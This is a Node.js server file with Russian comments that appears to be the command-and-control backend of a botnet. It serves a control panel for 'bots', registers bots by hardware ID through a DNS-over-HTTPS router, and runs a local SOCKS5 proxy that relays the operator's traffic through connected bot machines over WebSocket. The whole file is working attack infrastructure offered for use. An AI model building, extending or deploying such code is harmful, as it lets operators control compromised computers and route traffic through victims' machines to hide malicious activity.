const http      = require('http');
const express   = require('express');
const path      = require('path');
const { router, bots } = require('./doh');
const { initSockets }  = require('./sockets');
const WebSocket = require('ws');
const net       = require('net');

const PORT       = process.env.PORT      || 3000;  // main port
const SOCKS_PORT = process.env.SOCKS_PORT  || 1080;  // SOCKS5

const app = express();

// /dns-query, /api
app.use(router);
app.use(
  '/panel',
  express.static(path.join(__dirname, 'public'))
);
// GET /panel, чтобы отдавать index
app.get('/panel', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// боты ↔ панель
const server = http.createServer(app);
initSockets(server);

// WebSocket
const wss = new WebSocket.Server({ server, path: '/socks' });
const proxyConns = {};

wss.on('connection', (ws, req) => {
  const ip  = req.socket.remoteAddress.replace(/^::ffff:/, '');
  const bot = bots[ip];
  if (!bot || !bot.hwid) {
    return ws.close();
  }
  console.log(`SOCKS5 proxy WS connected from ${ip} (hwid=${bot.hwid})`);
  proxyConns[bot.hwid] = ws;

  ws.on('close', () => {
    console.log(`Proxy WS closed for hwid=${bot.hwid}`);
    delete proxyConns[bot.hwid];
  });
});

// SOCKS5 сервер
const socksServer = net.createServer(client => {
  const hwids = Object.keys(proxyConns);
  if (!hwids.length) {
    console.error('No bots');
    return client.destroy();
  }
  const ws = proxyConns[hwids[0]];
  if (ws.readyState !== WebSocket.OPEN) {
    return client.destroy();
  }

  client.on('data', chunk => ws.send(chunk));
  ws.on('message', data => client.write(data));

  client.on('close', () => ws.close());
  ws.on('close', () => client.destroy());
});

socksServer.listen(SOCKS_PORT, () => {
  console.log(`SOCKS5 на 127.0.0.1:${SOCKS_PORT}`);
});

server.listen(PORT, () => {
  console.log(`http://localhost:${PORT}/panel`);
});
